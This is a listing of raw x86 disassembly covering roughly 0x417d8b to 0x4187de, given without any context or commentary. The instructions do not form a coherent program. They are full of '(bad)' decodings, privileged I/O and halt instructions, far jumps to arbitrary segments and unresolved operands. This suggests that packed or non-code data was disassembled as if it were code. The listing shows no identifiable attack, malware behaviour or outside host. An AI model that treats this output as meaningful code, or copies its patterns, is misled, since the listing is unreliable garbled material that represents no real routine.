  417d8b:	mov    cl,0xc8
  417d8d:	popf   
  417d8e:	test   eax,0x4ec31fe5
  417d93:	std    
  417d94:	xor    DWORD PTR [ebx+0x6b368060],0x1e
  417d9b:	ds push edi
  417d9d:	jne    0x417df3
  417d9f:	rcr    BYTE PTR [esi],1
  417da1:	xchg   dl,ch
  417da3:	cmp    esp,DWORD PTR [ebp-0x53b30448]
  417da9:	in     eax,dx
  417daa:	mov    al,0x74
  417dac:	inc    ebx
  417dad:	repz cmps BYTE PTR gs:[esi],BYTE PTR es:[edi]
  417db0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417db1:	jle    0x417de7
  417db3:	ds das 
  417db5:	xor    al,0xc6
  417db7:	or     DWORD PTR [ebx+ecx*1+0x4c],edx
  417dbb:	outs   dx,DWORD PTR ds:[esi]
  417dbc:	aaa    
  417dbd:	lods   al,BYTE PTR ds:[esi]
  417dbe:	hlt    
  417dbf:	mov    bl,0x8
  417dc1:	push   ss
  417dc2:	fidiv  WORD PTR [edi+0x5e]
  417dc5:	or     BYTE PTR [ecx-0x77],0x95
  417dc9:	mov    edi,0xdfa82946
  417dce:	pop    ecx
  417dcf:	mov    edi,DWORD PTR [eax+0x3e]
  417dd2:	push   eax
  417dd3:	xchg   DWORD PTR [ecx+0x417c4b21],eax
  417dd9:	je     0x417d63
  417ddb:	loope  0x417d75
  417ddd:	mov    ah,0x43
  417ddf:	sti    
  417de0:	mov    esp,0x3080dd
  417de5:	add    eax,0xd14db34e
  417dea:	fsubr  DWORD PTR [esi+esi*4+0x82]
	...
  417e55:	add    BYTE PTR [edi],dl
  417e57:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417e5d:	addr16 dec esi
  417e5f:	sub    BYTE PTR [ecx+0x46],ch
  417e62:	and    DWORD PTR [ebx+0x50],ebx
  417e65:	xchg   ecx,eax
  417e66:	add    DWORD PTR [bx+di],eax
  417e69:	add    BYTE PTR [eax],al
  417e6b:	add    DWORD PTR [eax],eax
  417e6d:	add    dl,ah
  417e6f:	or     eax,0xa5766688
  417e74:	test   BYTE PTR [edi-0x22],al
  417e77:	call   0x8df5afe2
  417e7c:	jb     0x417e17
  417e7e:	dec    edi
  417e7f:	test   DWORD PTR [ecx+ebp*1-0x2b79390c],edi
  417e86:	push   edi
  417e87:	(bad)  [esi]
  417e89:	sbb    bh,bh
  417e8b:	push   ebx
  417e8c:	pop    eax
  417e8d:	sahf   
  417e8e:	and    eax,0x35170de
  417e93:	adc    dl,BYTE PTR [edi-0x7a]
  417e96:	scas   al,BYTE PTR es:[edi]
  417e97:	mov    ebp,0xdb5dae63
  417e9c:	cmp    ah,BYTE PTR [esi+0x53]
  417e9f:	push   eax
  417ea0:	nop
  417ea1:	inc    ebx
  417ea2:	ret    0xfe8b
  417ea5:	lods   eax,DWORD PTR ds:[esi]
  417ea6:	fisttp DWORD PTR [edx]
  417ea8:	lea    esi,[eax-0x3dcb60c9]
  417eae:	(bad)  
  417eaf:	fcom   QWORD PTR [eax]
  417eb1:	adc    al,0x5a
  417eb3:	dec    ecx
  417eb4:	adc    al,0x4c
  417eb6:	dec    ecx
  417eb7:	jns    0x417e59
  417eb9:	ss gs popa 
  417ebc:	cli    
  417ebd:	outs   dx,BYTE PTR ds:[esi]
  417ebe:	push   esp
  417ebf:	inc    eax
  417ec0:	push   esi
  417ec1:	jle    0x417edb
  417ec3:	cld    
  417ec4:	jnp    0x417e8d
  417ec6:	sbb    dl,BYTE PTR [ebp+0x44]
  417ec9:	(bad)  
  417eca:	push   ebp
  417ecb:	and    eax,DWORD PTR [edi+0xa]
  417ece:	xor    eax,0xf221cdc6
  417ed3:	push   0x3267320b
  417ed8:	gs push cs
  417eda:	dec    eax
  417edb:	daa    
  417edc:	inc    ebx
  417edd:	add    eax,0x7ba1c716
  417ee2:	js     0x417f24
  417ee4:	mov    ebp,0x5f4b79ee
  417ee9:	sub    BYTE PTR [ebp-0xb415c92],bl
  417eef:	out    0xd4,al
  417ef1:	push   ebp
  417ef2:	mov    ds:0xa445a612,eax
  417ef7:	add    eax,0x574a1907
  417efc:	retfw  0xd11e
  417f00:	ficom  DWORD PTR [ebx+0xded236c]
  417f06:	scas   al,BYTE PTR es:[edi]
  417f07:	mov    edx,0xee477137
  417f0c:	stc    
  417f0d:	jecxz  0x417ebf
  417f0f:	pop    edi
  417f10:	jns    0x417f4f
  417f12:	loop   0x417ec2
  417f14:	jg     0x417eb8
  417f16:	pop    ds
  417f17:	add    BYTE PTR [ebx],cl
  417f19:	rcl    BYTE PTR [edx+0x36dc9caf],cl
  417f1f:	lea    ebx,[edi+0x297074de]
  417f25:	bnd jb 0x417f26
  417f28:	push   edx
  417f2a:	pop    ecx
  417f2b:	adc    bl,BYTE PTR [edi]
  417f2d:	cld    
  417f2e:	dec    edx
  417f2f:	mov    dh,0xbc
  417f31:	mov    bh,0x30
  417f33:	pop    esi
  417f34:	data16 cmp al,0xae
  417f37:	in     al,0x8f
  417f39:	adc    DWORD PTR [eax+ebx*8-0x5f],0x6e
  417f3e:	lahf   
  417f3f:	(bad)  
  417f41:	out    0xa3,al
  417f43:	lods   al,BYTE PTR ds:[esi]
  417f44:	inc    ebx
  417f45:	mov    BYTE PTR [esi-0x33],ah
  417f48:	xor    ch,BYTE PTR [esi-0x77]
  417f4b:	pusha  
  417f4c:	ins    BYTE PTR es:[edi],dx
  417f4d:	cmp    cl,BYTE PTR [edi+0x38]
  417f50:	cmp    BYTE PTR [ebx],0x5c
  417f53:	push   ecx
  417f54:	aas    
  417f55:	das    
  417f56:	fcos   
  417f58:	xlat   BYTE PTR ds:[ebx]
  417f59:	jmp    0x672600d7
  417f5e:	and    BYTE PTR [eax],bl
  417f60:	mov    cl,0x80
  417f62:	xchg   ebp,eax
  417f63:	dec    ebx
  417f64:	sbb    edi,DWORD PTR [ebx+0x2b2ec37e]
  417f6a:	jge    0x417f50
  417f6c:	loop   0x417fa9
	...
  417fd6:	(bad)  
  417fd7:	out    0xe6,al
  417fd9:	cmp    esp,esi
  417fdb:	cmp    edi,edi
  417fdd:	push   DWORD PTR [edx]
  417fdf:	xchg   edx,eax
  417fe0:	xor    al,bh
  417fe2:	and    eax,0x67c9f515
  417fe7:	add    al,BYTE PTR [ecx]
  417fe9:	add    BYTE PTR [eax],al
  417feb:	add    DWORD PTR [eax],eax
  417fed:	add    BYTE PTR [esi+eiz*1],bl
  417ff0:	cli    
  417ff1:	inc    ecx
  417ff2:	ja     0x417fdf
  417ff4:	cld    
  417ff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ff6:	xor    BYTE PTR [ecx+edi*2],ah
  417ff9:	and    BYTE PTR [ecx-0x1d],bh
  417ffc:	pavgb  mm2,mm2
  417fff:	ret    
  418000:	cmp    BYTE PTR gs:[esi+0x3431cada],bh
  418007:	and    ax,0x17df
  41800b:	xchg   esp,eax
  41800c:	xchg   bp,ax
  41800e:	xor    bl,BYTE PTR [ecx]
  418010:	mov    WORD PTR [edi+ecx*1],cs
  418013:	push   ss
  418014:	xchg   esp,eax
  418015:	mov    edi,DWORD PTR [ecx]
  418017:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418018:	rol    ah,cl
  41801a:	mov    esp,0x888d5d24
  41801f:	mov    esp,0xad166652
  418024:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418025:	mov    ds:0xf2eb5a42,eax
  41802a:	pop    ebp
  41802b:	fcom   QWORD PTR [edx+eiz*4+0x21]
  41802f:	jnp    0x41800d
  418031:	adc    cl,BYTE PTR [edx]
  418033:	(bad)  
  418034:	and    DWORD PTR [edx-0xf459a4],edx
  41803a:	ja     0x418071
  41803c:	iret   
  41803d:	jmp    edi
  41803f:	dec    eax
  418040:	lods   eax,DWORD PTR ds:[esi]
  418041:	or     ebx,DWORD PTR [ecx-0x71e589d5]
  418047:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418048:	push   esi
  418049:	or     dl,dh
  41804b:	popa   
  41804c:	jns    0x417ffb
  41804e:	sbb    dh,BYTE PTR [edx]
  418050:	pop    ds
  418051:	retf   
  418052:	mov    dh,dl
  418054:	or     eax,0xa20332a
  418059:	add    BYTE PTR [ecx+0x6c],cl
  41805c:	push   edx
  41805d:	(bad)  [ebp-0x35]
  418060:	or     al,0xdf
  418062:	ja     0x4180b4
  418064:	in     al,dx
  418065:	aaa    
  418066:	enter  0xb8f6,0xb7
  41806a:	mov    WORD PTR [ebx-0x31],ds
  41806d:	cmp    eax,DWORD PTR [ecx]
  41806f:	inc    ebp
  418070:	xor    BYTE PTR [ebp+0x4c],ch
  418073:	mov    DWORD PTR [edi],esp
  418075:	mov    ecx,0xf7eb6d27
  41807a:	dec    ecx
  41807b:	xor    al,0xd1
  41807d:	dec    esp
  41807e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41807f:	scas   al,BYTE PTR es:[edi]
  418080:	sub    al,0x6d
  418082:	xor    eax,0x6d601021
  418087:	mov    al,ds:0x19cdd35d
  41808c:	and    esp,DWORD PTR [ecx+0x70c02c73]
  418092:	in     eax,dx
  418093:	mov    ah,0x94
  418095:	jbe    0x418109
  418097:	nop
  418098:	sbb    esp,DWORD PTR [eax]
  41809a:	dec    edi
  41809b:	mov    BYTE PTR [ecx-0x5f35e92],dh
  4180a1:	jmp    0xaa3b:0xdb16b15b
  4180a8:	xor    eax,0xfa39e251
  4180ad:	mov    cl,bh
  4180af:	sub    DWORD PTR [ebx],0x2c33d3a4
  4180b5:	aaa    
  4180b6:	mov    edx,0x5fef03ed
  4180bb:	xor    ebx,DWORD PTR [ebp+0x24]
  4180be:	aas    
  4180bf:	pop    eax
  4180c0:	push   0x11
  4180c2:	jmp    0x114d33ee
  4180c7:	das    
  4180c8:	mov    edi,0xb3fd3ef0
  4180cd:	push   edi
  4180ce:	push   0x92069259
  4180d3:	or     BYTE PTR [edx-0x6dc1dbca],ch
  4180d9:	test   eax,0x305e77b5
  4180de:	ins    BYTE PTR es:[edi],dx
  4180df:	shl    DWORD PTR [esi+0x12],0x4a
  4180e3:	mov    edi,0x82672891
  4180e8:	push   ebp
  4180e9:	jge    0x418142
  4180eb:	std    
  4180ec:	cmp    al,BYTE PTR [edi]
	...
  418156:	test   eax,0xff456b7e
  41815b:	push   ebp
  41815c:	scas   eax,DWORD PTR es:[edi]
  41815d:	(bad)  
  41815e:	mov    ds:0xa12fdebc,eax
  418163:	add    dl,BYTE PTR [ebx+0x1036730]
  418169:	add    BYTE PTR [eax],al
  41816b:	add    DWORD PTR [eax],eax
  41816d:	add    BYTE PTR [esp+edi*1],ch
  418170:	test   eax,0x9567f35e
  418175:	and    ah,BYTE PTR [esi]
  418177:	lea    ecx,[eax-0x569fea0e]
  41817d:	xchg   ebp,eax
  41817e:	mov    bh,bh
  418180:	sub    al,0x98
  418182:	cdq    
  418183:	xchg   bh,dl
  418185:	test   cl,0x6e
  418188:	in     eax,dx
  418189:	(bad)  [ebx]
  41818b:	push   esi
  41818c:	mov    WORD PTR [ebp-0x79],ds
  41818f:	sti    
  418190:	add    ebp,DWORD PTR [edx+ebx*2+0x4414a131]
  418197:	xor    eax,0x132d1bb9
  41819c:	or     dh,BYTE PTR [eax-0x2255c14]
  4181a2:	jp     0x4181f4
  4181a4:	xchg   ecx,eax
  4181a5:	xlat   BYTE PTR ds:[ebx]
  4181a6:	mov    bl,0x55
  4181a8:	inc    esp
  4181a9:	sub    DWORD PTR [edx],edi
  4181ab:	inc    ebx
  4181ac:	mov    ?,WORD PTR [ebx-0x46]
  4181af:	out    0x67,eax
  4181b1:	ins    DWORD PTR es:[edi],dx
  4181b2:	cmp    DWORD PTR [eax+0x2cb6f4ba],eax
  4181b8:	inc    eax
  4181b9:	mov    WORD PTR [esi],cs
  4181bb:	shr    ebx,0xf7
  4181be:	outs   dx,DWORD PTR ds:[esi]
  4181bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181c0:	and    eax,0x359955a1
  4181c5:	xchg   edi,eax
  4181c6:	(bad)  
  4181c7:	out    0x81,eax
  4181c9:	mov    ebx,0x63fc5315
  4181ce:	dec    eax
  4181cf:	outs   dx,DWORD PTR ds:[esi]
  4181d0:	bound  ax,DWORD PTR [ebp-0x6f998aaa]
  4181d7:	xchg   esp,eax
  4181d8:	dec    edx
  4181d9:	jae    0x41819a
  4181db:	popf   
  4181dc:	rcr    DWORD PTR [ebp-0x2698c833],cl
  4181e2:	shr    DWORD PTR [ebp-0x78],1
  4181e5:	pop    ebx
  4181e6:	sbb    al,BYTE PTR [ebx+0x5878b797]
  4181ec:	popa   
  4181ed:	and    al,0xef
  4181ef:	out    0x67,al
  4181f1:	push   edx
  4181f2:	push   ds
  4181f3:	cwde   
  4181f4:	xor    ch,ah
  4181f6:	and    al,0x37
  4181f8:	pop    ecx
  4181f9:	mov    bh,0xcc
  4181fb:	bound  ebx,QWORD PTR [ebx+0x352a4961]
  418201:	add    BYTE PTR [edx+0x34],ch
  418204:	jg     0x41826e
  418206:	jle    0x418280
  418208:	or     esi,DWORD PTR [eax-0x21]
  41820b:	mov    DWORD PTR [ebx+0x1e675496],edx
  418211:	outs   dx,BYTE PTR ds:[esi]
  418212:	repz (bad) 
  418214:	fisubr WORD PTR [eax+0x44]
  418217:	bound  edx,QWORD PTR [esi]
  418219:	cwde   
  41821a:	inc    ebx
  41821b:	pop    ds
  41821c:	jecxz  0x418284
  41821e:	pop    esi
  41821f:	sar    BYTE PTR [edi],cl
  418221:	pusha  
  418222:	nop
  418223:	push   ecx
  418224:	pop    es
  418225:	xchg   esp,eax
  418226:	sti    
  418227:	mov    DWORD PTR [edx-0x7a],esp
  41822a:	cmp    dh,dh
  41822c:	(bad)  
  41822d:	scas   eax,DWORD PTR es:[edi]
  41822e:	and    esp,0x2fe94d0d
  418234:	cmp    DWORD PTR [ecx],ecx
  418236:	push   ecx
  418237:	cmp    edi,DWORD PTR [esi+0xa]
  41823a:	sub    esp,ebp
  41823c:	in     al,dx
  41823d:	es daa 
  41823f:	shl    BYTE PTR [eax+0x14],0x8
  418243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418244:	jbe    0x41824c
  418246:	pop    esi
  418247:	sub    DWORD PTR [eax],ecx
  418249:	aaa    
  41824a:	jbe    0x4181ef
  41824c:	cmp    BYTE PTR [ebp+ebp*8-0x72],ch
  418250:	adc    eax,ebx
  418252:	fcomp  QWORD PTR [ebx]
  418254:	sub    cl,dh
  418256:	shr    DWORD PTR gs:[esi-0x1b2e503d],cl
  41825d:	shl    BYTE PTR [ecx+0x1548450],1
  418263:	mov    bh,0xc0
  418265:	or     al,0x2
  418267:	xor    edx,DWORD PTR [edx-0x16cad0b3]
  41826d:	test   DWORD PTR [eax],eax
	...
  4182d3:	add    BYTE PTR [eax],al
  4182d5:	add    BYTE PTR [edi],dh
  4182d7:	xchg   edx,eax
  4182d8:	and    al,0x83
  4182da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182db:	mov    bh,0xb7
  4182dd:	mov    dh,0x40
  4182df:	mov    ebx,0x695eb8d6
  4182e4:	lods   al,BYTE PTR ds:[esi]
  4182e5:	and    DWORD PTR [edi+0x4],0x1
  4182e9:	add    BYTE PTR [eax],al
  4182eb:	add    DWORD PTR [eax],eax
  4182ed:	add    BYTE PTR [eax-0x70850f9b],bh
  4182f3:	mov    eax,0x8980813d
  4182f8:	dec    ecx
  4182f9:	mov    dh,0x3d
  4182fb:	call   0x6ac0:0xba87bcb5
  418302:	mov    bh,0xc3
  418304:	ins    BYTE PTR es:[edi],dx
  418305:	or     al,0xd8
  418307:	call   0x2651:0x96f6ab1a
  41830e:	cmp    eax,0xa4753ac3
  418313:	cmp    BYTE PTR [bp+di-0x28],dh
  418317:	je     0x41838d
  418319:	pop    ebp
  41831a:	daa    
  41831b:	and    BYTE PTR [esi-0x4d],dl
  41831e:	xor    bh,BYTE PTR [ebx+edi*8+0x16]
  418322:	cmp    al,0xe5
  418324:	inc    ebp
  418325:	fistp  WORD PTR [eax+ebp*4-0x2a4a190a]
  41832c:	stc    
  41832d:	mov    eax,0x835825d3
  418332:	repnz push edx
  418334:	mov    esp,0xb09a2673
  418339:	out    dx,al
  41833a:	push   cs
  41833b:	inc    esi
  41833c:	iret   
  41833d:	mov    esp,0xc8f71074
  418342:	mov    cl,0xe8
  418344:	call   0xce83:0x6412d168
  41834b:	xor    eax,0xf9ffd427
  418350:	(bad)  
  418351:	sub    ebp,eax
  418353:	call   0x9aff764b
  418358:	sbb    eax,DWORD PTR [ecx+0x3c]
  41835b:	push   esp
  41835c:	fnstsw WORD PTR [ecx]
  41835e:	or     ah,bl
  418360:	push   0x8d4a332c
  418365:	sbb    ch,BYTE PTR [edx+0x4bdd197a]
  41836b:	fbstp  TBYTE PTR [edx-0x201bf69f]
  418371:	jne    0x418377
  418373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418374:	push   esp
  418375:	arpl   WORD PTR [eax-0x44844e51],cx
  41837b:	mov    bh,0x4c
  41837d:	in     eax,0x9e
  41837f:	push   0x4e
  418381:	call   0xfc770925
  418386:	or     eax,0x70351781
  41838b:	xchg   DWORD PTR [ebx+0x4c],ecx
  41838e:	gs pop ss
  418390:	jp     0x4183bf
  418392:	fldenv [ebp-0x42]
  418395:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418396:	and    DWORD PTR [edi+ecx*4],0xffffffc8
  41839a:	retf   0x2e9f
  41839d:	ins    DWORD PTR es:[edi],dx
  41839e:	cmp    BYTE PTR [eax-0x7d],dh
  4183a1:	jno    0x4183cc
  4183a3:	sub    eax,DWORD PTR [eax+0x61]
  4183a6:	fmul   DWORD PTR [edx-0x49]
  4183a9:	je     0x418376
  4183ab:	push   esp
  4183ac:	arpl   bx,si
  4183ae:	pop    edx
  4183af:	stos   DWORD PTR es:[edi],eax
  4183b0:	lods   al,BYTE PTR ds:[esi]
  4183b1:	sbb    al,0x4f
  4183b3:	pop    esi
  4183b4:	out    dx,eax
  4183b5:	cs add bh,ch
  4183b8:	hlt    
  4183b9:	mul    ah
  4183bb:	imul   ecx,DWORD PTR [eax],0xffffff83
  4183be:	inc    eax
  4183bf:	xchg   ebp,eax
  4183c0:	xchg   ebp,eax
  4183c1:	xchg   ebp,eax
  4183c2:	call   FWORD PTR [edx]
  4183c4:	pop    ecx
  4183c5:	push   edx
  4183c6:	scas   eax,DWORD PTR es:[edi]
  4183c7:	mov    esp,0x62d801ad
  4183cc:	ins    DWORD PTR es:[edi],dx
  4183cd:	int    0xaa
  4183cf:	mov    ds,WORD PTR [edi-0x69010730]
  4183d5:	pop    ds
  4183d6:	jmp    0xc02f4a16
  4183db:	gs jmp 0x5655631f
  4183e1:	test   DWORD PTR [ecx+esi*4],eax
  4183e4:	aaa    
  4183e5:	loop   0x41842a
  4183e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183e8:	dec    edx
  4183e9:	(bad)  
  4183ea:	fidiv  WORD PTR [eax+0x70]
  4183ed:	cwde   
	...
  418456:	fdiv   QWORD PTR [ebx-0x2380afc1]
  41845c:	(bad)  
  41845d:	mov    edi,0x14d871ac
  418462:	dec    esp
  418463:	sub    esp,eax
  418465:	sbb    eax,0x10567
  41846a:	add    BYTE PTR [ecx],al
  41846c:	add    BYTE PTR [eax],al
  41846e:	mov    ebp,0x48af6148
  418473:	pop    edx
  418474:	cli    
  418475:	adc    eax,0xbf6350cc
  41847a:	pop    ds
  41847b:	aam    0x3
  41847d:	cmp    esi,DWORD PTR [ebp-0x5de797f5]
  418483:	int    0xad
  418485:	xor    dl,BYTE PTR [ecx]
  418487:	lock mov ecx,0x5299528c
  41848d:	mov    al,dl
  41848f:	sbb    ebx,DWORD PTR [ebx]
  418491:	push   0xffffff98
  418493:	mov    bh,0xeb
  418495:	scas   eax,DWORD PTR es:[edi]
  418496:	add    esp,DWORD PTR [ebx]
  418498:	addr16 mov al,0x92
  41849b:	cwde   
  41849c:	mov    al,ds:0xe70bccdc
  4184a1:	aas    
  4184a2:	xor    BYTE PTR [ecx],bh
  4184a4:	adc    ah,bh
  4184a6:	dec    ebx
  4184a7:	jmp    0x5755041f
  4184ac:	pop    ss
  4184ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184ae:	cdq    
  4184af:	dec    ecx
  4184b0:	arpl   di,sp
  4184b2:	std    
  4184b3:	loop   0x4184ea
  4184b5:	add    DWORD PTR [ebp+0x78],ebx
  4184b8:	lahf   
  4184b9:	inc    esp
  4184ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184bb:	call   0x89e0:0x25dd1491
  4184c2:	enter  0x7e0a,0xd
  4184c6:	sub    bl,dl
  4184c8:	retf   0xa162
  4184cb:	(bad)  
  4184ce:	mov    ebx,0xdb7307bc
  4184d3:	inc    edx
  4184d4:	int    0x16
  4184d6:	into   
  4184d7:	xchg   ebp,eax
  4184d8:	xchg   edi,eax
  4184d9:	hlt    
  4184da:	xchg   edi,eax
  4184db:	pop    ecx
  4184dc:	sbb    BYTE PTR [esi],cl
  4184de:	add    DWORD PTR [edi-0xb],0x6df63ac4
  4184e5:	add    cl,dh
  4184e7:	cmp    BYTE PTR [eax+0x171bdb17],ah
  4184ed:	jo     0x4184a9
  4184ef:	xor    al,0xcb
  4184f1:	repz bound edi,QWORD PTR [ebp+ebx*4-0x49]
  4184f6:	inc    edi
  4184f7:	shl    DWORD PTR [edx-0x25],0x67
  4184fb:	jbe    0x418480
  4184fd:	mov    eax,ds:0xd6cd0c72
  418502:	lods   al,BYTE PTR ds:[esi]
  418503:	(bad)  
  418504:	and    DWORD PTR [edx-0x59],esp
  418507:	push   edi
  418508:	in     eax,0xe8
  41850a:	xchg   ebx,eax
  41850b:	adc    ah,al
  41850d:	cli    
  41850e:	xchg   al,al
  418510:	sub    ch,cl
  418512:	repz call 0x6ba2:0xcc0fb0c5
  41851a:	clc    
  41851b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41851c:	jno    0x41851a
  41851e:	cmp    eax,0x920c8e2e
  418523:	iret   
  418524:	div    bl
  418526:	add    bh,BYTE PTR [edx+esi*2-0x1855a50a]
  41852d:	sbb    dl,BYTE PTR [edi]
  41852f:	push   ecx
  418530:	cld    
  418531:	(bad)  
  418532:	mov    ds:0x2a6b3172,eax
  418537:	out    dx,eax
  418538:	aas    
  418539:	or     al,0x9c
  41853b:	imul   DWORD PTR [edi]
  41853d:	adc    ebp,DWORD PTR [edx+0x3a]
  418540:	sbb    DWORD PTR [eax],esi
  418542:	sub    eax,0x376e9c45
  418547:	outs   dx,DWORD PTR gs:[esi]
  418549:	pop    ebp
  41854a:	idiv   DWORD PTR [eax+0x41]
  41854d:	pop    DWORD PTR [edx+0x48]
  418550:	sub    al,0x82
  418552:	mov    bh,0x5f
  418554:	mov    edi,0x77d9dcea
  418559:	les    ecx,FWORD PTR [edx]
  41855b:	test   al,0x45
  41855d:	xor    DWORD PTR [eax+eax*4],ecx
  418560:	jmp    0xfffd:0x58408173
  418567:	lea    edi,[edi+ebx*2-0x19]
  41856b:	das    
  41856c:	ins    BYTE PTR es:[edi],dx
  41856d:	push   0x0
	...
  4185d6:	inc    ecx
  4185d7:	stc    
  4185d8:	mov    ebx,ebx
  4185da:	mov    ebx,0x26fb51fb
  4185df:	lods   al,BYTE PTR ds:[esi]
  4185e0:	imul   dl
  4185e2:	aas    
  4185e3:	adc    dh,BYTE PTR [ebx-0x46]
  4185e6:	addr16 push es
  4185e8:	add    DWORD PTR [eax],eax
  4185ea:	add    BYTE PTR [ecx],al
  4185ec:	add    BYTE PTR [eax],al
  4185ee:	(bad)  [edi-0x4d9d6d14]
  4185f4:	sub    ebx,DWORD PTR [edx+0x29]
  4185f7:	jmp    0x737743f
  4185fc:	scas   al,BYTE PTR es:[edi]
  4185fd:	addr16 xchg edi,eax
  4185ff:	pop    es
  418600:	test   al,0xc0
  418602:	push   ecx
  418603:	fadd   QWORD PTR [eax-0xf94fca2]
  418609:	sbb    DWORD PTR [edi-0x4],0x85292d39
  418610:	popf   
  418611:	shl    eax,cl
  418613:	retf   0x34d
  418616:	xchg   edx,eax
  418617:	sub    eax,0x980ee594
  41861c:	fidiv  DWORD PTR [esi]
  41861e:	add    BYTE PTR [ebx],dl
  418620:	leave  
  418621:	push   ebx
  418622:	jg     0x41865c
  418624:	leave  
  418625:	imul   ebp,DWORD PTR ds:0xa065e198,0x4f
  41862c:	fstp   DWORD PTR [ecx]
  41862e:	out    0x27,eax
  418630:	dec    edx
  418631:	push   ebx
  418632:	aam    0x33
  418634:	mov    ds:0xe68ab294,al
  418639:	arpl   WORD PTR [esi+0x47607f47],dx
  41863f:	jg     0x41866a
  418641:	stos   DWORD PTR es:[edi],eax
  418642:	pop    ds
  418643:	sub    esp,DWORD PTR [ebx]
  418645:	inc    esi
  418646:	mov    ds:0x26a318a4,eax
  41864b:	popf   
  41864c:	add    DWORD PTR [ecx],0xffffffc6
  41864f:	sbb    al,0xff
  418651:	out    dx,eax
  418652:	pop    ecx
  418653:	mov    al,0xc2
  418655:	mov    ebp,ds
  418657:	or     eax,DWORD PTR [esp+ebp*2]
  41865a:	and    BYTE PTR [edx],cl
  41865c:	das    
  41865d:	jge    0x418635
  41865f:	adc    al,0xec
  418661:	jecxz  0x4186a0
  418663:	dec    ecx
  418664:	int3   
  418665:	ja     0x418627
  418667:	mov    al,ss:0x5227999
  41866d:	outs   dx,DWORD PTR ds:[esi]
  41866e:	out    dx,eax
  41866f:	pop    ebp
  418670:	mov    dh,0x33
  418672:	lods   eax,DWORD PTR ds:[esi]
  418673:	xchg   ecx,eax
  418674:	clc    
  418675:	dec    ebp
  418676:	mov    esi,DWORD PTR [esi+edx*4]
  418679:	retf   
  41867a:	sbb    dl,BYTE PTR ds:0x4825328b
  418680:	int3   
  418681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418682:	sti    
  418683:	pusha  
  418684:	bound  esi,QWORD PTR [edx]
  418686:	mov    DWORD PTR [edx+0x6a],0xdcdb5194
  41868d:	mov    fs,WORD PTR [ecx-0xd]
  418690:	sub    BYTE PTR [ebx+0x30258934],dh
  418696:	ds pop edx
  418698:	jge    0x41868a
  41869a:	mov    dl,0x6e
  41869c:	fwait
  41869d:	ror    BYTE PTR [ecx+0x45],0x83
  4186a1:	xor    BYTE PTR [ebp-0x3cea01bd],0xa5
  4186a8:	mov    ?,ecx
  4186aa:	das    
  4186ab:	mov    cl,0x5a
  4186ad:	xchg   esi,eax
  4186ae:	icebp  
  4186af:	and    DWORD PTR [ebp-0x63],0x8
  4186b3:	cmp    eax,0xbc1e9bdc
  4186b8:	or     ecx,esp
  4186ba:	cmp    esp,ebx
  4186bc:	addr16 in al,dx
  4186be:	sub    DWORD PTR gs:[ebx+eiz*2+0x7b],eax
  4186c3:	(bad)  
  4186c4:	icebp  
  4186c5:	xor    al,0x6e
  4186c7:	jg     0x41864b
  4186c9:	ins    BYTE PTR es:[edi],dx
  4186ca:	add    dl,ch
  4186cc:	inc    edi
  4186cd:	imul   esi,DWORD PTR [esi+ecx*1+0x53],0xfffffff1
  4186d2:	mov    BYTE PTR [ebp+0x504f3ebf],dh
  4186d8:	lds    ecx,FWORD PTR [ebp+edx*8+0x7d5a1a7e]
  4186df:	inc    esp
  4186e0:	adc    ah,dl
  4186e2:	(bad)  
  4186e3:	cmc    
  4186e4:	daa    
  4186e5:	das    
  4186e6:	pushf  
  4186e7:	lahf   
  4186e8:	cmp    dh,dl
  4186ea:	into   
  4186eb:	imul   ebp,DWORD PTR [eax+eax*1+0x0]
	...
  418753:	add    BYTE PTR [eax],al
  418755:	add    BYTE PTR [ebx-0x44c35fd8],dl
  41875b:	mov    esp,0x8d0caf9f
  418760:	cmp    edx,edx
  418762:	aam    0x3c
  418764:	mul    DWORD PTR [ebp+0x67]
  418767:	pop    es
  418768:	add    DWORD PTR [eax],eax
  41876a:	add    BYTE PTR [ecx],al
  41876c:	add    BYTE PTR [eax],al
  41876e:	jns    0x418789
  418770:	lahf   
  418771:	sub    ah,BYTE PTR ds:0x131bcf77
  418777:	shl    al,0x28
  41877a:	jge    0x41875a
  41877c:	push   ebx
  41877d:	inc    ecx
  41877e:	mov    es,ebx
  418780:	pushf  
  418781:	call   0xe1ee:0xb7caf307
  418788:	xchg   dh,dl
  41878a:	push   esi
  41878b:	leave  
  41878c:	pushf  
  41878d:	inc    eax
  41878e:	sbb    ch,0x2c
  418791:	jo     0x418753
  418793:	rcr    BYTE PTR [ebp+0x79],cl
  418796:	pop    es
  418797:	cmp    al,0xae
  418799:	in     eax,0x20
  41879b:	retf   0xa26d
  41879e:	pop    esi
  41879f:	fnstcw WORD PTR [eax+0x6f]
  4187a2:	mov    bl,dh
  4187a4:	jge    0x4187ee
  4187a6:	loopne 0x41873d
  4187a8:	pop    edx
  4187a9:	call   0x2146:0xe5cf0579
  4187b0:	cmc    
  4187b1:	mov    esi,0xb36f55ba
  4187b6:	test   eax,0xebddaf59
  4187bb:	icebp  
  4187bc:	scas   eax,DWORD PTR es:[edi]
  4187bd:	fisttp QWORD PTR [ecx+0x2d]
  4187c0:	cmp    DWORD PTR [eax+0x5d54ab4a],ecx
  4187c6:	gs sbb al,0x46
  4187c9:	jecxz  0x41874e
  4187cb:	fwait
  4187cc:	mov    ebp,0xb721a70a
  4187d1:	out    dx,al
  4187d2:	inc    eax
  4187d3:	lods   eax,DWORD PTR ds:[esi]
  4187d4:	push   DWORD PTR [ebx-0x29502449]
  4187da:	pop    edx
  4187db:	int    0xcf
  4187dd:	aaa    
  4187de:	adc    al,bl
